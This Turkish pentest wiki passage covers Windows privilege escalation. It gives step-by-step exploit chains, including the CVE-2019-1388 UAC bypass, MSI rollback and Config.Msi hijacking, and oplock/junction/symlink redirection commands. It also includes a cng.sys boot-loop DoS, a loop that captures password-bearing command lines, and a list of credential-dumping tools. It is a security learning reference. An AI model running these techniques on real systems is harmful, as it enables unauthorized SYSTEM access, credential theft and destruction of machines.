**Pipe** olarak adlandırılan paylaşılan memory segment'leri, process iletişimini ve veri aktarımını sağlar.

Windows, ilgisiz process'lerin farklı network'ler üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu yapı, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı client/server mimarisine benzer.

Bir **client** bir pipe üzerinden veri gönderdiğinde, pipe'ı oluşturan **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** belirlemek, oluşturduğunuz pipe ile etkileşime girdiğinde bu process'in kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı sağlar. Böyle bir saldırının nasıl gerçekleştirileceğine ilişkin yararlı kılavuzları [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulabilirsiniz.

Ayrıca aşağıdaki tool, named pipe iletişimini burp gibi bir tool ile **intercept etmenize** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool, privesc'leri bulmak için tüm pipe'ları listeleyip görüntülemenize olanak tanır:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server modundaki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) endpoint'ini açığa çıkarır. Remote bir authenticated client, mailslot tabanlı async event yolunu abuse ederek `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya **rastgele bir 4-byte write** gerçekleştirecek şekilde kullanabilir; ardından Telephony admin haklarını elde edip service olarak rastgele bir DLL yükleyebilir. Tam akış:

- `pszDomainUser` writable mevcut bir path olarak ayarlanmış şekilde `ClientAttach` → service, `CreateFileW(..., OPEN_EXISTING)` üzerinden bu dosyayı açar ve async event write'ları için kullanır.
- Her event, `Initialize` içindeki saldırgan kontrollü `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministic write'ları tekrarlamak için unregister/shutdown işlemlerini gerçekleştirin.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyin, yeniden bağlanın, ardından `GetUIDllName` fonksiyonunu rastgele bir DLL path'i ile çağırarak `TSPI_providerUIIdentify` fonksiyonunu `NETWORK SERVICE` olarak çalıştırın.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown link'leri, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve saldırgan kontrollü dosyaları mevcut user olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Bir user olarak shell elde ettiğinizde, **credential'ları command line üzerinde ileten** scheduled task'ler veya diğer process'ler çalıştırılıyor olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak tüm farklılıkları çıktılar.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Process'lerden parola çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (console veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi herhangi bir işlemi çalıştırmak mümkündür.

Bu, aynı vulnerability ile aynı anda privilege escalation gerçekleştirmeyi ve UAC'yi bypass etmeyi mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığından yararlanmak için aşağıdaki adımların gerçekleştirilmesi gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level / UAC Bypass'e

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'leri** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan teknik ve [**burada bulunan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit kodu.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı temel olarak, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğinin kötüye kullanılmasından oluşur. Bunun için saldırganın, diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak üzere Windows Installer tarafından kullanılacak olan `C:\Config.Msi` klasörünü hijack etmek için kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; bu rollback dosyaları daha sonra kötü amaçlı payload içerecek şekilde değiştirilir.

Tekniğin özeti şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` klasörünü boş bırakma)**

- Adım 1: MSI'ı yükleme
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin; böylece **admin olmayan bir kullanıcı** çalıştırabilir.
- Yükleme sonrasında dosyaya ait bir **handle** açık tutun.

- Adım 2: Kaldırmayı başlatma
- Aynı `.msi` dosyasını kaldırın.
- Kaldırma işlemi dosyaları `C:\Config.Msi` klasörüne taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
- Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini tespit etmek için açık dosya **handle**'ını `GetFinalPathNameByHandle` kullanarak **poll** edin.

- Adım 3: Özel senkronizasyon
- `.msi`, şu işlemleri yapan bir **özel kaldırma action'ı (`SyncOnRbfWritten`)** içerir:
- `.rbf` yazıldığında sinyal verir.
- Ardından kaldırma işlemine devam etmeden önce başka bir event'i bekler.

- Adım 4: `.rbf` dosyasının silinmesini engelleme
- Sinyal geldiğinde, **`.rbf` dosyasını** `FILE_SHARE_DELETE` olmadan açın — bu, dosyanın silinmesini **engeller**.
- Ardından kaldırma işleminin tamamlanabilmesi için geri sinyal gönderin.
- Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını manuel olarak silme
- `.rbf` dosyasını manuel olarak siz (saldırgan) silin.
- Artık **`C:\Config.Msi` boş** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için **SYSTEM seviyesindeki arbitrary folder delete açığını tetikleyin**.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` klasörünü zayıf ACL'lerle yeniden oluşturma
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Zayıf DACL'ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` ile bir **handle**'ı açık tutun.

- Adım 7: Başka bir Install çalıştırma
- `.msi` dosyasını şu ayarlarla tekrar yükleyin:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
- Bu yükleme, `.rbs` ve `.rbf` dosyalarını tekrar okuyan **rollback** işlemini tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` için izleme
- Yeni bir `.rbs` görünene kadar `C:\Config.Msi` klasörünü izlemek için `ReadDirectoryChangesW` kullanın.
- Dosya adını yakalayın.

- Adım 9: Rollback öncesinde senkronizasyon
- `.msi`, şu işlemleri yapan bir **özel install action'ı (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event'e sinyal verir.
- Ardından devam etmeden önce bekler.

- Adım 10: Zayıf ACL'yi yeniden uygulama
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` klasörüne **güçlü ACL'leri yeniden uygular**.
- Ancak hâlâ `WRITE_DAC` içeren bir handle'a sahip olduğunuz için **zayıf ACL'leri tekrar uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken uygulanır**, bu nedenle klasöre hâlâ yazabilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` bırakma
- `.rbs` dosyasının üzerine, Windows'a şunları söyleyen **sahte bir rollback script'i** yazın:
- `.rbf` dosyanızı (kötü amaçlı DLL) **privileged** bir konuma geri yüklemek (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Kötü amaçlı SYSTEM seviyesinde payload DLL'i içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback'i tetikleme
- Installer'ın devam etmesi için sync event'ine sinyal verin.
- Bilinen bir noktada yüklemeyi **kasıtlı olarak başarısız kılmak** üzere bir **type 19 custom action (`ErrorOut`)** yapılandırılmıştır.
- Bu, **rollback'in başlamasına** neden olur.

- Adım 13: SYSTEM DLL'inizi yükler
- Windows Installer:
- Kötü amaçlı `.rbs` dosyanızı okur.
- `.rbf` DLL'inizi hedef konuma kopyalar.
- Artık **SYSTEM tarafından yüklenen bir path'te kötü amaçlı DLL'iniz** bulunur.

- Son Adım: SYSTEM kodunu çalıştırma
- Hijack ettiğiniz DLL'i yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **tam bir klasörü** (ör. `C:\Config.Msi`) silebilmenizi varsayar. Peki açığınız yalnızca **arbitrary file deletion** sağlıyorsa ne olur?

**NTFS internals**'ı exploit edebilirsiniz: her klasörde şu adlı gizli bir alternate data stream bulunur:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata** bilgilerini depolar.

Dolayısıyla bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS klasörün tamamını dosya sisteminden **kaldırır**.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API'si çağırıyor olsanız bile, **klasörün kendisini siler**.

### Folder Contents Delete'ten SYSTEM EoP'ye
Primitive'iniz rastgele file/folder'ları silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir folder'ın *contents*'ini silmenize izin veriyorsa** ne olur?

1. Adım 1: Bir bait folder ve file oluşturun
- Oluşturun: `C:\temp\folder1`
- İçinde: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Privileged bir process `file1.txt`'yi silmeye çalıştığında oplock **execution'ı duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM process'i tetikleyin (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback'i içinde silme işlemini yeniden yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
- Bu işlem, oplock'i bozmadan `folder1` klasörünü boşaltır.
- `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i vaktinden önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS dahili stream'ini hedefler — bu stream'in silinmesi klasörü siler.

5. Adım 5: Oplock'i serbest bırakma
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi junction + symlink nedeniyle aslında silinen:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Arbitrary Folder Create ile Kalıcı DoS

**Dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile, **SYSTEM/admin olarak arbitrary folder oluşturmanıza** olanak tanıyan bir primitive'den yararlanın.

**Critical Windows driver** adını taşıyan bir **folder** oluşturun (file değil), örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- Bunu **önceden bir klasör olarak oluşturursanız**, Windows gerçek driver'ı boot sırasında yükleyemez.
- Ardından Windows, boot sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümleyemez** ve **boot işlemi çöker veya durur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı log/backup yollarından + OM symlink'lerinden arbitrary file overwrite / boot DoS'a

Bir **ayrıcalıklı service**, log/export işlemlerini **yazılabilir bir config** dosyasından okunan bir yola yazdığında, ayrıcalıklı yazma işlemini arbitrary overwrite işlemine dönüştürmek için bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirin (**SeCreateSymbolicLinkPrivilege olmadan bile**).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu saklayan config'in attacker tarafından yazılabilir olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna bir mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek chain**
1. Ayrıcalıklı log hedefini kurtarmak için config'i okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component'in log'u yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna gerçekleşir.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi (hex/PE parser) inceleyin; yeniden başlatma, Windows'un değiştirilmiş driver path'ini yüklemesini zorlar → **boot loop DoS**. Bu yöntem, privileged service'in yazma amacıyla açacağı tüm protected file'lar için de geçerlidir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir; bu da bozuk veriler için güvenilir bir DoS hedefi olmasını sağlar.



## **High Integrity'den SYSTEM'e**

### **Yeni servis**

Zaten bir High Integrity process üzerinde çalışıyorsanız, yalnızca yeni bir service **oluşturup çalıştırarak** **SYSTEM'e giden path** kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity process üzerinden **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[İlgili registry key'leri ve bir _.msi_ package'ın nasıl kurulacağı hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Bu token privilege'larına sahipseniz (muhtemelen bunları zaten High Integrity olan bir process içinde bulacaksınız), SeDebug privilege'ı ile **neredeyse tüm process'leri** (protected process'ler hariç) **açabilecek**, process'in **token'ını kopyalayabilecek** ve **bu token ile rastgele bir process oluşturabileceksiniz**.\
Bu technique genellikle **tüm token privilege'larına sahip SYSTEM olarak çalışan herhangi bir process'in seçilmesini** içerir (_evet, tüm token privilege'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen technique'i gerçekleştiren bir kod örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu technique, meterpreter tarafından `getsystem` içinde privilege escalation yapmak için kullanılır. Technique, **bir pipe oluşturmayı ve ardından bu pipe'a yazmak için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından, **`SeImpersonate`** privilege'ını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service) **token'ını impersonate edebilecek** ve SYSTEM privilege'larını elde edebilecektir.\
Name pipe'lar hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
Name pipe kullanarak [**High Integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'i **hijack etmeyi** başarırsanız, bu izinlerle arbitrary code çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır; ayrıca, dll'leri yüklemek için kullanılan klasörlerde **write permission** bulunacağından, **High Integrity process'ten gerçekleştirilmesi çok daha kolaydır**.\
**Dll hijacking hakkında** [**daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vector'larını bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı session bilgilerini çıkarır. Local ortamda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credential'ları çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan password'ları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle tool'udur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerability'lerini arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerability'lerini arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak host'u enumerate eder (privesc tool'undan çok bilgi toplama tool'udur) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda software'den credential'ları çıkarır (github'da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmayı kontrol eder (github'da executable precompiled olarak bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (Python'dan alınmış exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu post temel alınarak oluşturulmuş tool'dur (düzgün çalışmak için accesschk erişimi gerekmez, ancak accesschk kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak compile etmelisiniz ([**buraya bakın**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host'ta kurulu .NET sürümünü görmek için şunu çalıştırabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetkileri yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - kısa başvuru rehberi](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Privilege Escalation Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi decryption → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Shadows'ta Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Link. Windows'ta Symbolic Link'lerden Yararlanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Dangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Windows LPE için CLDFLT ve DirectX Kernel Race Conditions zincirleme kullanımı](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11'de tam Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes'ten Yararlanarak Yetki Yükseltme ve Diğer Harika Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, bir Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation When An Image Change Leads To A Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
